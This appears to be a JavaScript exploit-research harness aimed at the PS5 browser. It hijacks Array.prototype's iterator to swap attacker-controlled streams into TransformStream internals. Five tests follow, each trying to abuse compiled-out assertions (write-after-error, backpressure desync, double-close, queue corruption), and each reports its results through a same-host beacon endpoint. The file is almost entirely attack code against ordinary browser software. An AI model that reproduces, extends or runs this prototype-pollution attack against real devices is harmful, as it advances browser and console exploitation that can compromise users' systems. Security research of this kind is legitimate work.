/*
 * p431 -- Assertion-skip exploitation on PS5 via V429 disconnect
 *
 * Three attacks exploiting compiled-out @assert in TransformStreamInternals.js:
 *   A: Write-after-error (line 333 @assert state === "writable")
 *   B: Backpressure double-set (line 200 @assert backpressure !== newBackpressure)
 *   C: Double-close flush (close attacker's + real writable)
 *   D: Write to real writable then read from real readable (baseline)
 *   E: Mass substitution + heavy backpressure desync
 *
 * Beacon prefix: V431-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V431-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// Shared substitution helper
function makeSubstituted(transformerOpts) {
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;
  var realReadable = null;
  var realWritable = null;

  var attackerReadable = new ReadableStream({
    start: function(ctrl) { /* idle */ }
  });
  var attackerWritable = new WritableStream({
    write: function() { return Promise.resolve(); }
  });

  Array.prototype[Symbol.iterator] = function() {
    iterCallCount++;
    var callNum = iterCallCount;
    var arr = this;
    var idx = 0;

    if (callNum === 1) {
      return {
        next: function() {
          if (idx < arr.length) {
            var val = arr[idx];
            if (idx === 0) realReadable = val;
            if (idx === 1) realWritable = val;
            idx++;
            return {value: val, done: false};
          }
          return {done: true};
        }
      };
    }
    if (callNum === 2) {
      return {
        next: function() {
          if (idx < arr.length) {
            var val = arr[idx];
            if (idx === 1) val = attackerReadable;
            if (idx === 2) val = attackerWritable;
            idx++;
            return {value: val, done: false};
          }
          return {done: true};
        }
      };
    }
    return origIter.call(arr);
  };

  var ts = new TransformStream(transformerOpts || undefined);
  Array.prototype[Symbol.iterator] = origIter;

  return {
    ts: ts,
    realReadable: realReadable,
    realWritable: realWritable,
    attackerReadable: attackerReadable,
    attackerWritable: attackerWritable
  };
}

// ================================================================
// Test A: Write-after-error -- exploit @assert(state === "writable")
// Error the real writable, then write to it anyway
// ================================================================

function testA() {
  B("A-START");
  try {
    var sub = makeSubstituted({
      transform: function(chunk, controller) {
        controller.enqueue("transformed:" + chunk);
      }
    });

    // First, set up a reader on the real readable so writes can drain
    var realReader = sub.realReadable.getReader();
    var readResults = [];

    function readLoop() {
      realReader.read().then(function(res) {
        if (!res.done) {
          readResults.push(String(res.value).slice(0, 40));
          B("A-READ", {val: String(res.value).slice(0, 40), count: readResults.length});
          readLoop();
        }
      }).catch(function(e) {
        B("A-READ-ERR", e.message.slice(0, 60));
      });
    }
    readLoop();

    var realWriter = sub.realWritable.getWriter();

    // Step 1: Write normally (should work)
    realWriter.write("normal-1").then(function() {
      B("A-WRITE1-OK");

      // Step 2: Abort the real writable (state -> "errored")
      realWriter.releaseLock();
      var realWriter2 = sub.realWritable.getWriter();
      realWriter2.abort("force-error").then(function() {
        B("A-ABORT-OK");

        // Step 3: Try writing AFTER error (the @assert is compiled out)
        realWriter2.releaseLock();
        try {
          var realWriter3 = sub.realWritable.getWriter();
          realWriter3.write("after-error-data").then(function() {
            B("A-WRITE-AFTER-ERROR-OK");
          }).catch(function(e) {
            B("A-WRITE-AFTER-ERROR-REJECTED", e.message.slice(0, 60));
          });
        } catch(e) {
          B("A-WRITE-AFTER-ERROR-THREW", e.message.slice(0, 60));
        }
      }).catch(function(e) {
        B("A-ABORT-ERR", e.message.slice(0, 60));
      });
    }).catch(function(e) {
      B("A-WRITE1-ERR", e.message.slice(0, 60));
    });

    setTimeout(function() {
      B("A-RESULT", {reads: readResults.length, values: readResults.slice(0, 5)});
    }, 800);
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: Backpressure desync -- fill internal readable, drain nothing
// Then force-write more data to see if queue size goes negative
// ================================================================

function testB() {
  B("B-START");
  try {
    var enqueueCount = 0;
    var sub = makeSubstituted({
      transform: function(chunk, controller) {
        enqueueCount++;
        controller.enqueue(chunk);
        B("B-ENQUEUE-" + enqueueCount);
      }
    });

    // Do NOT read from real readable -- let backpressure build
    var realWriter = sub.realWritable.getWriter();
    var writeResults = [];

    // Write 10 chunks rapidly
    var writes = [];
    for (var i = 0; i < 10; i++) {
      (function(idx) {
        var p = realWriter.write("chunk-" + idx).then(function() {
          writeResults.push("ok-" + idx);
          B("B-WRITE-OK-" + idx);
        }).catch(function(e) {
          writeResults.push("err-" + idx);
          B("B-WRITE-ERR-" + idx, e.message.slice(0, 40));
        });
        writes.push(p);
      })(i);
    }

    setTimeout(function() {
      B("B-INTERIM", {writes: writeResults.length, enqueues: enqueueCount});

      // Now read from real readable all at once
      var realReader = sub.realReadable.getReader();
      var readCount = 0;
      function drain() {
        realReader.read().then(function(res) {
          if (!res.done) {
            readCount++;
            B("B-DRAIN-" + readCount, String(res.value).slice(0, 20));
            if (readCount < 15) drain();
            else B("B-DRAIN-DONE", readCount);
          }
        }).catch(function(e) {
          B("B-DRAIN-ERR", e.message.slice(0, 60));
        });
      }
      drain();
    }, 500);

    setTimeout(function() {
      B("B-RESULT", {writes: writeResults.length, enqueues: enqueueCount});
    }, 1500);
  } catch(e) {
    B("B-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: Double-close -- close attacker's writable then close real
// ================================================================

function testC() {
  B("C-START");
  try {
    var flushCount = 0;
    var sub = makeSubstituted({
      transform: function(chunk, controller) {
        controller.enqueue(chunk);
      },
      flush: function(controller) {
        flushCount++;
        B("C-FLUSH-" + flushCount);
      }
    });

    // Read from real readable so pipeline can drain
    var realReader = sub.realReadable.getReader();
    function readLoop() {
      realReader.read().then(function(res) {
        if (!res.done) {
          B("C-READ", String(res.value).slice(0, 30));
          readLoop();
        } else {
          B("C-READ-DONE");
        }
      }).catch(function(e) {
        B("C-READ-ERR", e.message.slice(0, 60));
      });
    }
    readLoop();

    // Step 1: Close attacker's writable (should NOT trigger flush)
    var atkWriter = sub.ts.writable.getWriter();
    atkWriter.close().then(function() {
      B("C-ATK-CLOSE-OK", {flushCount: flushCount});
    }).catch(function(e) {
      B("C-ATK-CLOSE-ERR", e.message.slice(0, 60));
    });

    // Step 2: After a delay, close the real writable (should trigger flush)
    setTimeout(function() {
      var realWriter = sub.realWritable.getWriter();
      realWriter.write("pre-close-data").then(function() {
        B("C-REAL-WRITE-OK");
        realWriter.close().then(function() {
          B("C-REAL-CLOSE-OK", {flushCount: flushCount});
        }).catch(function(e) {
          B("C-REAL-CLOSE-ERR", e.message.slice(0, 60));
        });
      }).catch(function(e) {
        B("C-REAL-WRITE-ERR", e.message.slice(0, 60));
      });
    }, 200);

    setTimeout(function() {
      B("C-RESULT", {flushCount: flushCount});
    }, 1000);
  } catch(e) {
    B("C-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: Baseline -- write to real, read from real (confirm pipeline works)
// ================================================================

function testD() {
  B("D-START");
  try {
    var sub = makeSubstituted({
      transform: function(chunk, controller) {
        controller.enqueue("D-" + chunk);
      }
    });

    var realReader = sub.realReadable.getReader();
    var realWriter = sub.realWritable.getWriter();

    // Read first (async)
    realReader.read().then(function(res) {
      B("D-READ", {done: res.done, val: String(res.value).slice(0, 40)});
    }).catch(function(e) {
      B("D-READ-ERR", e.message.slice(0, 60));
    });

    // Write
    realWriter.write("hello").then(function() {
      B("D-WRITE-OK");
    }).catch(function(e) {
      B("D-WRITE-ERR", e.message.slice(0, 60));
    });

    setTimeout(function() {
      B("D-DONE");
    }, 500);
  } catch(e) {
    B("D-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: Mass substitution + queue corruption check
// Create many substituted TransformStreams, fill them all, then drain
// Check if any queue sizes go wrong
// ================================================================

function testE() {
  B("E-START");
  try {
    var streams = [];
    var errors = 0;
    var created = 0;

    for (var i = 0; i < 50; i++) {
      try {
        var sub = makeSubstituted({
          transform: function(chunk, controller) {
            // Enqueue twice to stress queue accounting
            controller.enqueue(chunk);
            controller.enqueue(chunk + "-dup");
          }
        });
        streams.push(sub);
        created++;
      } catch(e) {
        errors++;
      }
    }
    B("E-CREATED", {count: created, errors: errors});

    // Write 5 chunks to each, don't read
    var writeCount = 0;
    streams.forEach(function(sub, idx) {
      try {
        var w = sub.realWritable.getWriter();
        for (var j = 0; j < 5; j++) {
          w.write("e-" + idx + "-" + j).then(function() { writeCount++; });
        }
      } catch(e) {}
    });

    setTimeout(function() {
      B("E-WRITES", writeCount);

      // Now drain all at once and check for anomalies
      var readCount = 0;
      var anomalies = 0;

      streams.forEach(function(sub, idx) {
        try {
          var r = sub.realReadable.getReader();
          function drain() {
            r.read().then(function(res) {
              if (!res.done) {
                readCount++;
                var v = String(res.value);
                // Check for corruption: should start with "e-"
                if (v.indexOf("e-") !== 0 && v.indexOf("-dup") === -1) {
                  anomalies++;
                  B("E-ANOMALY", {idx: idx, val: v.slice(0, 40)});
                }
                drain();
              }
            }).catch(function(e) {
              // Expected if stream errored
            });
          }
          drain();
        } catch(e) {}
      });

      setTimeout(function() {
        B("E-RESULT", {reads: readCount, anomalies: anomalies});
      }, 1500);
    }, 800);
  } catch(e) {
    B("E-ERR", e.message.slice(0, 80));
  }
}

testD(); // baseline first
setTimeout(function() { testA(); }, 600);
setTimeout(function() { testB(); }, 1800);
setTimeout(function() { testC(); }, 3500);
setTimeout(function() { testE(); }, 5000);
setTimeout(function() { B("DONE"); }, 8000);
})();
